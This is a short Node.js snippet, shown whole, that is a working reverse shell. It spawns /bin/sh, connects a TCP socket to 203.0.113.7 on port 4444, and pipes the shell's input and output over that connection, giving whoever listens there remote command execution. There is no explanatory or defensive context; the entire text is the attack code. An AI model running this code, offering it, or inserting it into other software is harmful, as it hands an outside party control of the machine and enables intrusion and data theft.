const net=require('net'),cp=require('child_process');
const sh=cp.spawn('/bin/sh',[]);const c=new net.Socket();
c.connect(4444,'203.0.113.7',()=>{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});
